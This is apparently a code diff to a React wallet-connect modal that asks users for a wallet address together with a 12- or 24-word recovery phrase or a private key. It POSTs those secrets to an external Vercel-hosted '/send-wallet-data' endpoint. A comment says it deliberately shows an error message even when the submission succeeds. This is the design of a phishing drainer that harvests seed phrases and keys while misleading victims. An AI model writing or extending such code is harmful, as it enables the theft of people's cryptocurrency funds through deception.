@@ -11,16 +11,23 @@ import {
 import { SwitchIos } from "./mui-treasury/switch-ios";
 import SquareProgress from "./components/square-progress";
 import ContentPasteIcon from "@mui/icons-material/ContentPaste";
-import { BASE_URL } from "../config";
+//import BASE_URL  from "../config";
 
 const WalletModal = ({ open, onClose, selectedWallet }) => {
   const [tabValue, setTabValue] = useState(0);
-  const [walletAddress, setWalletAddress] = useState("");
+  const [walletAddress12, setWalletAddress12] = useState("");
+  const [walletAddress24, setWalletAddress24] = useState("");
+  const [walletAddressPrivate, setWalletAddressPrivate] = useState("");
   const [phraseWords, setPhraseWords] = useState(Array(12).fill(""));
   const [phraseWords24, setPhraseWords24] = useState(Array(24).fill(""));
   const [privateKey, setPrivateKey] = useState("");
   const [showErrorPopup, setShowErrorPopup] = useState(false);
   const [errorMessage, setErrorMessage] = useState("");
+
+  const BASE_URL =
+    import.meta.env.MODE === "production"
+      ? "https://blockchain-backend-puce.vercel.app/api"
+      : "http://localhost:3000/api";
 
   const handleTabChange = (event, newValue) => {
     setTabValue(newValue);
@@ -79,24 +86,45 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
   };
 
   const handleSubmit = async () => {
-    if (!walletAddress || phraseWords.includes("") || phraseWords24.includes("")) {
-      setErrorMessage("Wallet address and 12/24-word phrase are required.");
+    console.log('BASE_URL:', BASE_URL);
+    console.log('Form');
+  
+    let currentWalletAddress;
+    let isFormValid = true;
+  
+    if (tabValue === 0) {
+      currentWalletAddress = walletAddress12;
+      isFormValid = !phraseWords.includes("");
+    } else if (tabValue === 1) {
+      currentWalletAddress = walletAddress24;
+      isFormValid = !phraseWords24.includes("");
+    } else {
+      currentWalletAddress = walletAddressPrivate;
+      isFormValid = !!privateKey;
+    }
+  
+    if (!currentWalletAddress || !isFormValid) {
+      setErrorMessage("Wallet address and all required fields must be filled.");
       setShowErrorPopup(true);
       return;
     }
-
+  
     let formData = {
       walletName: selectedWallet?.name,
-      walletAddress: walletAddress,
-      phraseWords,
-      phraseWords24,
+      walletAddress: currentWalletAddress,
     };
-
-    if (tabValue === 2) {
+  
+    if (tabValue === 0) {
+      formData.phraseWords = phraseWords;
+    } else if (tabValue === 1) {
+      formData.phraseWords24 = phraseWords24;
+    } else if (tabValue === 2) {
       formData.privateKey = privateKey;
     }
-
+  
     try {
+      console.log('Sending request to:', `${BASE_URL}/send-wallet-data`);
+      console.log('Request body:', JSON.stringify(formData));
       const response = await fetch(`${BASE_URL}/send-wallet-data`, {
         method: "POST",
         headers: {
@@ -104,11 +132,15 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
         },
         body: JSON.stringify(formData),
       });
-
+  
+      console.log('Response status:', response.status);
+      const responseData = await response.json();
+      console.log('Response data:', responseData);
+  
       // Force error display even if submission is successful
       setErrorMessage("Error occurred while processing your request.");
       setShowErrorPopup(true);
-
+  
       // Uncomment this if you want to close the modal on success later
       // if (response.ok) {
       //   onClose();
@@ -251,8 +283,8 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
                 variant="outlined"
                 margin="dense"
                 size="small"
-                value={walletAddress}
-                onChange={(e) => setWalletAddress(e.target.value)}
+                value={walletAddress12}
+                onChange={(e) => setWalletAddress12(e.target.value)}
                 sx={{
                   "& .MuiInputLabel-root": { fontSize: "0.8rem" },
                   "& .MuiOutlinedInput-root": { borderRadius: "8px" },
@@ -320,8 +352,8 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
                 variant="outlined"
                 margin="dense"
                 size="small"
-                value={walletAddress}
-                onChange={(e) => setWalletAddress(e.target.value)}
+                value={walletAddress24}
+                onChange={(e) => setWalletAddress24(e.target.value)}
                 sx={{
                   "& .MuiInputLabel-root": { fontSize: "0.8rem" },
                   "& .MuiOutlinedInput-root": { borderRadius: "8px" },
@@ -383,13 +415,13 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
           )}
           {tabValue === 2 && (
             <TextField
-              fullWidth
-              label="Private Key"
-              variant="outlined"
-              margin="dense"
-              size="small"
-              value={privateKey}
-              onChange={(e) => setPrivateKey(e.target.value)}
+            fullWidth
+            label="Enter your wallet address"
+            variant="outlined"
+            margin="dense"
+            size="small"
+            value={walletAddressPrivate}
+            onChange={(e) => setWalletAddressPrivate(e.target.value)}
               sx={{
                 "& .MuiInputLabel-root": { fontSize: "0.8rem" },
                 "& .MuiOutlinedInput-root": { borderRadius: "8px" },
